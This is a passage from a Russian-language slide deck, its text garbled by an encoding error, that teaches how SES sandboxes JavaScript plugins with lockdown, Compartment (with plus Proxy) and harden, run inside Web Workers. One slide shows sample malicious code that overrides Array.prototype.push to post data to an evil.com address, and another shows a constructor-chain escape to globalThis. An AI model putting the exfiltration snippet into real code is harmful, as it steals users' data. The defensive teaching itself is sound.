    A[SES] --> B[Lockdown –ó–∞–º–æ—Ä–æ–∑–∫–∞&nbsp;–≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã—Ö&nbsp;–æ–±—ä–µ–∫—Ç–æ–≤]
    A --> C[Compartment –ò–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–∞—è&nbsp;—Å—Ä–µ–¥–∞&nbsp;–≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è]
    A --> D[Harden –ì–ª—É–±–æ–∫–∞—è&nbsp;–∑–∞–º–æ—Ä–æ–∑–∫–∞&nbsp;–æ–±—ä–µ–∫—Ç–æ–≤]
    style A fill:#2c3e50,stroke:#34495e,color:#fff
    style B fill:#3498db,stroke:#2980b9,color:#fff
    style C fill:#9b59b6,stroke:#8e44ad,color:#fff
    style D fill:#e74c3c,stroke:#c0392b,color:#fff
                        </pre>
                    </div>
                </section>

                <!-- –®–∞–≥ 1: Intrinsics -->
                <section>
                    <h3>–®–∞–≥ 1: –ß—Ç–æ —Ç–∞–∫–æ–µ intrinsics?</h3>
                    <p><strong>Intrinsics</strong> ‚Äî –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã JavaScript</p>
                    <pre><code class="javascript" data-trim data-line-numbers>
// –ü—Ä–∏–º–µ—Ä—ã intrinsics
Array
Object
Function
Date
Math
Promise
String
Number
// ... –∏ –∏—Ö –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã
Array.prototype
Object.prototype
// ... –≤—Å–µ–≥–æ ~200 –æ–±—ä–µ–∫—Ç–æ–≤
                    </code></pre>
                </section>

                <section>
                    <h3>–ü—Ä–æ–±–ª–µ–º–∞: –º–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å</h3>
                    <pre><code class="javascript" data-trim data-line-numbers>
// –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å intrinsics
Array.prototype.push = function() {
  // –û—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ —Ö–∞–∫–µ—Ä—É
  fetch('https://evil.com/steal', { 
    method: 'POST',
    body: JSON.stringify(this) 
  });
  // –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å –Ω–æ—Ä–º–∞–ª—å–Ω–æ
  return Array.prototype.push.call(this, ...arguments);
};

// –¢–µ–ø–µ—Ä—å –í–°–ï –º–∞—Å—Å–∏–≤—ã –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω—ã
const items = [1, 2, 3];
items.push(4); // –î–∞–Ω–Ω—ã–µ —É—Ç–µ–∫–ª–∏! üò±
                    </code></pre>
                </section>

                <!-- –®–∞–≥ 2: Lockdown -->
                <section>
                    <h3>–®–∞–≥ 2: –†–µ–∞–ª–∏–∑—É–µ–º Lockdown</h3>
                    <p>–¶–µ–ª—å: –∑–∞–º–æ—Ä–æ–∑–∏—Ç—å –≤—Å–µ intrinsics</p>
                </section>

                <section>
                    <h3>–®–∞–≥ 2.1: –ù–∞–π—Ç–∏ –≤—Å–µ intrinsics</h3>
                    <pre style="font-size: 0.5em;"><code class="javascript" data-trim data-line-numbers="1-35|5-9|15-31|33|34">
// –£–ø—Ä–æ—â—ë–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è
function getAllIntrinsics() {
  const intrinsics = new Set();
  
  // –°—Ç–∞—Ä—Ç–æ–≤—ã–µ –æ–±—ä–µ–∫—Ç—ã
  const roots = [
    Object, Array, Function, String, Number,
    Boolean, Date, RegExp, Error, Promise,
    Map, Set, WeakMap, WeakSet, JSON, Math
  ];
  
  // –û–±—Ö–æ–¥ –≥—Ä–∞—Ñ–∞ –æ–±—ä–µ–∫—Ç–æ–≤
  const visited = new WeakSet();
  
  function visit(obj) {
    if (!obj || visited.has(obj)) return;
    visited.add(obj);
    intrinsics.add(obj);
    
    // –î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ—Ç–æ—Ç–∏–ø
    const proto = Object.getPrototypeOf(obj);
    if (proto) visit(proto);
    
    // –î–æ–±–∞–≤–∏—Ç—å —Å–≤–æ–π—Å—Ç–≤–∞
    Object.getOwnPropertyNames(obj).forEach(key =&gt; {
      const value = obj[key];
      if (typeof value === 'object' || typeof value === 'function') {
        visit(value);
      }
    });
  }
  
  roots.forEach(visit);
  return intrinsics;
}
                    </code></pre>
                </section>

                <section>
                    <h3>–®–∞–≥ 2.2: –ó–∞–º–æ—Ä–æ–∑–∏—Ç—å intrinsics</h3>
                    <pre><code class="javascript" data-trim>
// –£–ø—Ä–æ—â—ë–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è lockdown
function lockdown() {
  const intrinsics = getAllIntrinsics();
  
  // –ó–∞–º–æ—Ä–æ–∑–∏—Ç—å –∫–∞–∂–¥—ã–π intrinsic
  intrinsics.forEach(obj =&gt; {
    Object.freeze(obj);
  });
  
  console.log('‚úÖ –í—Å–µ intrinsics –∑–∞–º–æ—Ä–æ–∂–µ–Ω—ã!');
}

// –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ
lockdown();

// –¢–µ–ø–µ—Ä—å –Ω–µ–ª—å–∑—è –∏–∑–º–µ–Ω–∏—Ç—å
Array.prototype.push = function() {}; // ‚ùå –û—à–∏–±–∫–∞!
Object.freeze = function() {}; // ‚ùå –û—à–∏–±–∫–∞!
                    </code></pre>
                </section>

                <section>
                    <h3>–ü—Ä–æ–±–ª–µ–º–∞: constructor –∏ __proto__</h3>
                    <pre><code class="javascript" data-trim>
// –î–∞–∂–µ –ø–æ—Å–ª–µ freeze –º–æ–∂–Ω–æ "–ø–æ–¥–Ω—è—Ç—å—Å—è" –ø–æ —Ü–µ–ø–æ—á–∫–µ
const arr = [];
arr.constructor // Array
  .prototype    // Array.prototype
  .constructor  // Array
  .constructor  // Function üò±
  ('return this')() // globalThis!

// –ê—Ç–∞–∫—É—é—â–∏–π –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ Function
// –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –∫–æ–¥
                    </code></pre>
                </section>

                <section>
                    <h3>–®–∞–≥ 2.3: –ó–∞–º–µ–Ω–∏—Ç—å constructor</h3>
                    <pre style="font-size: 0.5em;"><code class="javascript" data-trim data-line-numbers="1-22|2,4,17|7-13|16|20-22">
function lockdown() {
  const intrinsics = getAllIntrinsics();
  
  intrinsics.forEach(obj =&gt; {
    // –ó–∞–º–µ–Ω–∏—Ç—å .constructor –Ω–∞ frozen dummy
    if (obj.constructor) {
      Object.defineProperty(obj, 'constructor', {
        value: Object.freeze(function() {
          throw new TypeError('–ó–∞–ø—Ä–µ—â–µ–Ω–æ');
        }),
        writable: false,
        configurable: false
      });
    }
    
    Object.freeze(obj);
  });
}

// –¢–µ–ø–µ—Ä—å –±–µ–∑–æ–ø–∞—Å–Ω–æ
const arr = [];
arr.constructor.constructor('alert(1)'); // ‚ùå TypeError!
                    </code></pre>
                </section>

                <!-- –®–∞–≥ 3: Compartment -->
                <section>
                    <h3>–®–∞–≥ 3: –†–µ–∞–ª–∏–∑—É–µ–º Compartment</h3>
                    <p>–¶–µ–ª—å: —Å–æ–∑–¥–∞—Ç—å –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Ä–µ–¥—É –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è</p>
                </section>

                <section>
                    <h3>–ß—Ç–æ –Ω—É–∂–Ω–æ –¥–ª—è –∏–∑–æ–ª—è—Ü–∏–∏?</h3>
                    <ul>
                        <li>‚úÖ –°–≤–æ–π globalThis (–Ω–æ –Ω–µ window)</li>
                        <li>‚úÖ –°–≤–æ–π eval (–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–π)</li>
                        <li>‚úÖ –û–±—â–∏–µ intrinsics (Array, Object)</li>
                        <li>‚ùå –ù–µ—Ç fetch, localStorage, document</li>
                    </ul>
                </section>

                <section>
                    <h3>–®–∞–≥ 3.1: –°–æ–∑–¥–∞—ë–º globalThis</h3>
                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim data-line-numbers="1-20|22-25">
class Compartment {
  constructor(endowments = {}) {
    // –°–æ–∑–¥–∞—ë–º –ø—É—Å—Ç–æ–π –æ–±—ä–µ–∫—Ç —Å —Ç–µ–º–∏ –∂–µ intrinsics
    this.globalThis = Object.create(null);
    
    // –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã–µ API
    Object.assign(this.globalThis, {
      // –ë–µ–∑–æ–ø–∞—Å–Ω—ã–µ intrinsics
      Array,
      Object,
      String,
      Number,
      Math,
      JSON,
      
      // API, –∫–æ—Ç–æ—Ä—ã–µ —è–≤–Ω–æ –ø–µ—Ä–µ–¥–∞–ª–∏
      ...endowments
    });
  }
}

// –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ
const c = new Compartment({
  console: console // –Ø–≤–Ω–æ —Ä–∞–∑—Ä–µ—à–∞–µ–º
});
                    </code></pre>
                </section>

                <section>
                    <h3>–®–∞–≥ 3.2: –ü—Ä–æ–±–ª–µ–º–∞ —Å eval</h3>
                    <pre><code class="javascript" data-trim>
// –ù–∞–∏–≤–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞
class Compartment {
  evaluate(code) {
    // ‚ùå –¢–∞–∫ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç!
    // eval –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –≤ —Ç–µ–∫—É—â–µ–º scope
    return eval(code);
  }
}

const c = new Compartment();
c.evaluate('fetch("evil.com")'); 
// –ü–æ–ª—É—á–∏—Ç –¥–æ—Å—Ç—É–ø –∫ –Ω–∞—Å—Ç–æ—è—â–µ–º—É fetch! üò±
                    </code></pre>
                </section>

                <section>
                    <h3>–®–∞–≥ 3.3: "–ú–∞–≥–∏—è with + Proxy"</h3>
                    <p>–°–µ–∫—Ä–µ—Ç–Ω—ã–π —Å–æ—É—Å SES</p>
                    <pre style="font-size: 0.35em;"><code class="javascript" data-trim data-line-numbers="1-30|2-7|9-29|10-17|21-28">
class Compartment {
  constructor(endowments = {}) {
    this.globalThis = { ...endowments };
    
    // –°–æ–∑–¥–∞—ë–º evaluator (—É–ø—Ä–æ—â—ë–Ω–Ω–æ)
    this.evaluate = this.createEvaluator();
  }
  
  createEvaluator() {
    // Proxy –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–º
    const scopeProxy = new Proxy(this.globalThis, {
      has: () =&gt; true,  // –í—Å–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ "—Å—É—â–µ—Å—Ç–≤—É—é—Ç"
      get: (target, key) =&gt; {
        if (key === Symbol.unscopables) return undefined;
        return target[key]; // –ë–µ—Ä—ë–º –∏–∑ –Ω–∞—à–µ–≥–æ globalThis
      }
    });
    
    // with —Å–æ–∑–¥–∞—ë—Ç –Ω–æ–≤—ã–π scope
    // eval –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –≤ —ç—Ç–æ–º scope
    return Function('scopeProxy', `
      with (scopeProxy) {
        return function(code) {
          "use strict";
          return eval(code);
        }
      }
    `)(scopeProxy);
  }
}
                    </code></pre>
                </section>

                <section>
                    <h3>–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç with + Proxy</h3>
                    <pre><code class="javascript" data-trim>
// 1. with —Å–æ–∑–¥–∞—ë—Ç –Ω–æ–≤—ã–π scope
with (scopeProxy) {
  // 2. –ü—Ä–∏ –ø–æ–∏—Å–∫–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π fetch
  fetch; 
  // JavaScript —Å–ø—Ä–∞—à–∏–≤–∞–µ—Ç scopeProxy.has('fetch')
  // Proxy –æ—Ç–≤–µ—á–∞–µ—Ç: true
  // JavaScript –ø—ã—Ç–∞–µ—Ç—Å—è –ø–æ–ª—É—á–∏—Ç—å scopeProxy.get('fetch')
  // Proxy –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç: undefined (—Ç.–∫. –Ω–µ –ø–µ—Ä–µ–¥–∞–ª–∏)
}

// –†–µ–∑—É–ª—å—Ç–∞—Ç: fetch === undefined ‚úÖ
// –ù–µ –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å –Ω–∞—Å—Ç–æ—è—â–∏–π fetch!
                    </code></pre>
                </section>

                <section>
                    <h3>–î–∏–∞–≥—Ä–∞–º–º–∞ —Ä–∞–±–æ—Ç—ã with + Proxy</h3>
                    <div class="mermaid">
                        <pre>
%%{init: {'theme':'neutral'}}%%
sequenceDiagram
    participant P as –ü–ª–∞–≥–∏–Ω
    participant W as with statement
    participant Px as Proxy
    participant G as globalThis
    
    P->>W: fetch('evil.com')
    W->>Px: has('fetch')?
    Px-->>W: true (—á—Ç–æ–±—ã –Ω–µ –±—ã–ª–æ ReferenceError)
    W->>Px: get('fetch')
    Px->>G: globalThis['fetch']
    G-->>Px: undefined (–Ω–µ –ø–µ—Ä–µ–¥–∞–ª–∏)
    Px-->>W: undefined
    W-->>P: TypeError: fetch is not a function ‚úÖ
                        </pre>
                    </div>
                </section>

                <section>
                    <h3>–ü–æ–ª–Ω–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è Compartment</h3>
                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim  data-line-numbers="1-31|3-7|9-15|17-24|29-31">
class Compartment {
  constructor(endowments = {}) {
    this.globalThis = {
      // –ë–µ–∑–æ–ø–∞—Å–Ω—ã–µ intrinsics
      Array, Object, String, Number, Math, JSON,
      ...endowments
    };
    
    const scopeProxy = new Proxy(this.globalThis, {
      has: () => true,
      get: (target, key) => {
        if (key === Symbol.unscopables) return undefined;
        return target[key];
      }
    });
    
    this.evaluate = Function('proxy', `
      with (proxy) {
        return function(code) {
          "use strict";
          return eval(code);
        }
      }
    `)(scopeProxy);
  }
}

// –ì–æ—Ç–æ–≤–æ! üéâ
const c = new Compartment({ console });
c.evaluate('console.log("Hello from compartment!")');
c.evaluate('fetch("evil.com")'); // ‚ùå TypeError
                    </code></pre>
                </section>

                <!-- –®–∞–≥ 4: Harden -->
                <section>
                    <h3>–®–∞–≥ 4: –†–µ–∞–ª–∏–∑—É–µ–º harden()</h3>
                    <p>–¶–µ–ª—å: –≥–ª—É–±–æ–∫–æ –∑–∞–º–æ—Ä–æ–∑–∏—Ç—å –æ–±—ä–µ–∫—Ç</p>
                </section>

                <section>
                    <h3>Object.freeze vs harden</h3>
                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim>
const obj = {
  name: 'Alice',
  settings: {
    theme: 'dark'
  }
};

// Object.freeze ‚Äî –ø–æ–≤–µ—Ä—Ö–Ω–æ—Å—Ç–Ω–∞—è –∑–∞–º–æ—Ä–æ–∑–∫–∞
Object.freeze(obj);
obj.name = 'Bob';              // ‚ùå –ù–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç
obj.settings.theme = 'light';  // ‚úÖ –°—Ä–∞–±–æ—Ç–∞–µ—Ç! üò±

// harden ‚Äî –≥–ª—É–±–æ–∫–∞—è –∑–∞–º–æ—Ä–æ–∑–∫–∞
harden(obj);
obj.name = 'Bob';              // ‚ùå –ù–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç
obj.settings.theme = 'light';  // ‚ùå –ù–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç ‚úÖ
                    </code></pre>
                </section>

                <section>
                    <h3>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è harden</h3>
                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim data-line-numbers="1-33|10-11|13-21|23-27|2-8">
function harden(obj) {
  // –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –ø–æ—Å–µ—â—ë–Ω–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã
  const visited = new WeakSet();
  
  function deepFreeze(target) {
    // –£–∂–µ –∑–∞–º–æ—Ä–æ–∑–∏–ª–∏
    if (visited.has(target)) return target;
    visited.add(target);
    
    // –ó–∞–º–æ—Ä–æ–∑–∏—Ç—å —Å–∞–º –æ–±—ä–µ–∫—Ç
    Object.freeze(target);
    
    // –†–µ–∫—É—Ä—Å–∏–≤–Ω–æ –∑–∞–º–æ—Ä–æ–∑–∏—Ç—å —Å–≤–æ–π—Å—Ç–≤–∞
    Object.getOwnPropertyNames(target).forEach(key => {
      const value = target[key];
      
      // –ï—Å–ª–∏ —Å–≤–æ–π—Å—Ç–≤–æ ‚Äî –æ–±—ä–µ–∫—Ç, –∑–∞–º–æ—Ä–æ–∑–∏—Ç—å –µ–≥–æ —Ç–æ–∂–µ
      if (value && typeof value === 'object') {
        deepFreeze(value);
      }
    });
    
    // –ó–∞–º–æ—Ä–æ–∑–∏—Ç—å –ø—Ä–æ—Ç–æ—Ç–∏–ø
    const proto = Object.getPrototypeOf(target);
    if (proto && proto !== Object.prototype) {
      deepFreeze(proto);
    }
    
    return target;
  }
  
  return deepFreeze(obj);
}
                    </code></pre>
                </section>

                <section>
                    <h3>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ harden</h3>
                    <pre style="font-size: 0.4em;"><code class="javascript" data-trim>
const api = {
  getData: () => [1, 2, 3],
  config: {
    timeout: 5000,
    retries: 3
  }
};

// –î–µ–ª–∞–µ–º API –Ω–µ–∏–∑–º–µ–Ω—è–µ–º—ã–º –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–¥–∞—á–µ–π –ø–ª–∞–≥–∏–Ω—É
harden(api);

// –¢–µ–ø–µ—Ä—å –ø–ª–∞–≥–∏–Ω –Ω–µ –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å API
api.getData = () => []; // ‚ùå –û—à–∏–±–∫–∞
api.config.timeout = 0; // ‚ùå –û—à–∏–±–∫–∞

// API –±–µ–∑–æ–ø–∞—Å–µ–Ω –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –Ω–µ–Ω–∞–¥—ë–∂–Ω–æ–º—É –∫–æ–¥—É
const c = new Compartment({ api: api });
c.evaluate('api.getData()'); // [1, 2, 3]
                    </code></pre>
                </section>

                <!-- –°–æ–±–∏—Ä–∞–µ–º –≤—Å—ë –≤–º–µ—Å—Ç–µ -->
                <section>
                    <h3>–°–æ–±–∏—Ä–∞–µ–º –≤—Å—ë –≤–º–µ—Å—Ç–µ</h3>
                    <pre style="font-size: 0.6em;"><code class="javascript" data-trim data-line-numbers="1-27|1-2|4-8|10-11|13-16|18-23|25-27">
// –®–∞–≥ 1: –ó–∞–º–æ—Ä–æ–∑–∏—Ç—å intrinsics
lockdown();

// –®–∞–≥ 2: –°–æ–∑–¥–∞—Ç—å API –¥–ª—è –ø–ª–∞–≥–∏–Ω–∞
const pluginAPI = {
  notify: (msg) => console.log('[Plugin]', msg),
  getData: () => ({ user: 'Alice' })
};

// –®–∞–≥ 3: –ó–∞–º–æ—Ä–æ–∑–∏—Ç—å API
harden(pluginAPI);

// –®–∞–≥ 4: –°–æ–∑–¥–∞—Ç—å Compartment
const compartment = new Compartment({
  api: pluginAPI
});

// –®–∞–≥ 5: –ó–∞–ø—É—Å—Ç–∏—Ç—å –ø–ª–∞–≥–∏–Ω
const pluginCode = `
  api.notify('Hello from plugin!');
  const data = api.getData();
  api.notify('Got data: ' + data.user);
`;

compartment.evaluate(pluginCode);
// [Plugin] Hello from plugin!
// [Plugin] Got data: Alice
                    </code></pre>
                </section>

                 <section>
                    <h3>–ò—Ç–æ–≥–æ–≤–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞</h3>
                    <div class="mermaid">
%%{init: {'theme':'neutral'}}%%
graph TB
    subgraph App[–û—Å–Ω–æ–≤–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ]
        L[lockdown<br/>Intrinsics –∑–∞–º–æ—Ä–æ–∂–µ–Ω—ã]
        API[harden pluginAPI<br/>API –∑–∞–º–æ—Ä–æ–∂–µ–Ω]
        
        subgraph Comp[Compartment]
            GT[globalThis –ø—É—Å—Ç–æ–π]
            PR[Proxy –ø–µ—Ä–µ—Ö–≤–∞—Ç]
            EV[eval –±–µ–∑–æ–ø–∞—Å–Ω—ã–π]
            
            subgraph Plugin[–ö–æ–¥ –ø–ª–∞–≥–∏–Ω–∞]
                OK1[api.notify —Ä–∞–∑—Ä–µ—à–µ–Ω]
                NO1[fetch –∑–∞–ø—Ä–µ—â–µ–Ω]
                NO2[localStorage –∑–∞–ø—Ä–µ—â–µ–Ω]
            end
        end
    end
    
    L --> API
    API --> Comp
    GT --> PR
    PR --> EV
    EV --> Plugin
    
    style App fill:#ecf0f1,stroke:#95a5a6
    style L fill:#3498db,stroke:#2980b9,color:#fff
    style API fill:#9b59b6,stroke:#8e44ad,color:#fff
    style Comp fill:#e8f4f8,stroke:#3498db
    style Plugin fill:#fef5e7,stroke:#f39c12
    style OK1 fill:#2ecc71,stroke:#27ae60,color:#fff
    style NO1 fill:#e74c3c,stroke:#c0392b,color:#fff
    style NO2 fill:#e74c3c,stroke:#c0392b,color:#fff
                    </div>
                </section>


                <section>
                    <h3>–ù–∞—Å—Ç–æ—è—â–∏–π SES —Å–ª–æ–∂–Ω–µ–µ</h3>
                    <p>–ù–∞—à–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è ‚Äî —É–ø—Ä–æ—â—ë–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è –¥–ª—è –ø–æ–Ω–∏–º–∞–Ω–∏—è</p>
                    <br>
                    <p><strong>–†–µ–∞–ª—å–Ω—ã–π SES —Ç–∞–∫–∂–µ:</strong></p>
                    <ul style="font-size: 0.85em;">
                        <li>–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç ~200 intrinsics, –∞ –Ω–µ 6</li>
                        <li>–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç import/export –º–æ–¥—É–ª–µ–π</li>
                        <li>–ó–∞—â–∏—â–∞–µ—Ç –æ—Ç –∞—Ç–∞–∫ —á–µ—Ä–µ–∑ Symbol.unscopables</li>
                        <li>–ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç re-entrancy –∞—Ç–∞–∫–∏</li>
                        <li>–û–ø—Ç–∏–º–∏–∑–∏—Ä—É–µ—Ç –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å Proxy</li>
                        <li>–°–æ–≤–º–µ—Å—Ç–∏–º —Å–æ –≤—Å–µ–º–∏ –±—Ä–∞—É–∑–µ—Ä–∞–º–∏</li>
                    </ul>
                </section>

                <section>
                    <h3>–ö–ª—é—á–µ–≤—ã–µ –≤—ã–≤–æ–¥—ã</h3>
                    <ol style="font-size: 0.6em;">
                        <li><strong>Lockdown</strong> –∑–∞–º–æ—Ä–∞–∂–∏–≤–∞–µ—Ç intrinsics ‚Üí –Ω–µ–ª—å–∑—è –∏—Å–ø–æ—Ä—Ç–∏—Ç—å –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã</li>
                        <li><strong>Compartment</strong> –∏—Å–ø–æ–ª—å–∑—É–µ—Ç with + Proxy ‚Üí –∏–∑–æ–ª—è—Ü–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö</li>
                        <li><strong>Harden</strong> –≥–ª—É–±–æ–∫–æ –∑–∞–º–æ—Ä–∞–∂–∏–≤–∞–µ—Ç ‚Üí API –±–µ–∑–æ–ø–∞—Å–µ–Ω –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏</li>
                    </ol>
                    <br><br>
                    <p style="font-size: 0.8em;"><em>–í–º–µ—Å—Ç–µ = –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–µ–Ω–∞–¥—ë–∂–Ω–æ–≥–æ –∫–æ–¥–∞ ‚úÖ</em></p>
                </section>
            </section>

            <section>
                <section>
                    <h2>–ü–ª–∞–≥–∏–Ω—ã –±–µ–∑ UI</h2>
                    <h3>SES + Web Workers</h3>
                </section>

                <section>
                    <h3>–ó–∞—á–µ–º –ø–ª–∞–≥–∏–Ω—ã –±–µ–∑ UI?</h3>
                    <ul>
                        <li>‚öôÔ∏è –¢—è–∂—ë–ª—ã–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏—è (–æ–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö)</li>
                        <li>üîÑ –§–æ–Ω–æ–≤–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ (–ø–∞—Ä—Å–∏–Ω–≥, –≤–∞–ª–∏–¥–∞—Ü–∏—è)</li>
                        <li>üßÆ –ú–∞—Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–∏</li>
                        <li>üìä –ê–Ω–∞–ª–∏–∑ –∏ —Ç—Ä–∞–Ω—Å—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö</li>
                        <li>üöÄ –ù–µ –±–ª–æ–∫–∏—Ä—É—é—Ç –≥–ª–∞–≤–Ω—ã–π –ø–æ—Ç–æ–∫</li>
                    </ul>
                </section>

                <section>
                    <h3>–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞: Main Thread + Worker</h3>
                    <div class="mermaid">
%%{init: {'theme':'neutral'}}%%
graph TB
    subgraph Main[Main Thread]
        App[React App]
        API[Plugin API]
    end
    
    subgraph Worker[Web Worker]
        subgraph SES[SES Compartment]
            Plugin[Plugin Code]
        end
    end
    
    App --&gt;|postMessage| Worker
    Worker --&gt;|postMessage| App
    API --&gt;|–ö–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç| Worker
    SES --&gt;|–ò–∑–æ–ª–∏—Ä—É–µ—Ç| Plugin
    
    style Main fill:#ecf0f1,stroke:#95a5a6
    style Worker fill:#e8f4f8,stroke:#3498db
    style SES fill:#fef5e7,stroke:#f39c12
    style Plugin fill:#d5f4e6,stroke:#27ae60
                    </div>
                </section>

                <section>
                    <h3>Worker Thread vs Main Thread</h3>
                    <table style="font-size: 0.8em;">
                        <thead>
                            <tr>
                                <th>–•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∞</th>
                                <th>Main Thread</th>
                                <th>Worker Thread</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>–î–æ—Å—Ç—É–ø –∫ DOM</td>
                                <td>‚úÖ –ï—Å—Ç—å</td>
                                <td>‚ùå –ù–µ—Ç</td>
                            </tr>
                            <tr>
                                <td>–ë–ª–æ–∫–∏—Ä—É–µ—Ç UI</td>
                                <td>‚ö†Ô∏è –î–∞</td>
                                <td>‚úÖ –ù–µ—Ç</td>
                            </tr>
                            <tr>
                                <td>–í—ã—á–∏—Å–ª–µ–Ω–∏—è</td>
                                <td>‚ö†Ô∏è –ú–µ–¥–ª–µ–Ω–Ω–æ</td>
                                <td>‚úÖ –ë—ã—Å—Ç—Ä–æ</td>
                            </tr>
                            <tr>
                                <td>SES –∏–∑–æ–ª—è—Ü–∏—è</td>
                                <td>‚úÖ –î–∞</td>
                                <td>‚úÖ –î–∞</td>
                            </tr>
                        </tbody>
                    </table>
                </section>
                <section>
                    <h3>–ü–æ—Ç–æ–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è</h3>
                    <div class="mermaid">
%%{init: {'theme':'neutral'}}%%
sequenceDiagram
    participant User as –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
    participant App as React App
    participant Hook as useWorkerPlugin
    participant Worker as Web Worker
    participant SES as SES Compartment
    participant Plugin as Plugin
    
    User-&gt;&gt;App: Click "Process"
    App-&gt;&gt;Hook: execute('calculateStats', data)
    Hook-&gt;&gt;Worker: postMessage({type: 'EXECUTE'})
    Worker-&gt;&gt;SES: compartment.evaluate()
    SES-&gt;&gt;Plugin: calculateStats(data)
    Plugin-&gt;&gt;Plugin: –í—ã—á–∏—Å–ª–µ–Ω–∏—è (–Ω–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç UI)
    Plugin--&gt;&gt;SES: result
    SES--&gt;&gt;Worker: result
    Worker--&gt;&gt;Hook: postMessage({type: 'RESULT'})
    Hook--&gt;&gt;App: onResult(data)
    App--&gt;&gt;User: –ü–æ–∫–∞–∑–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                    </div>
                </section>


                <!-- –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –≤ Worker -->
                <section>
                    <h3>–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –≤ Worker</h3>

<ul>
  <li>‚ùå –ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ DOM <small style="vertical-align: middle;">(–Ω–µ—Ç document)</small></li>
  <li>‚ùå –ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ window</li>
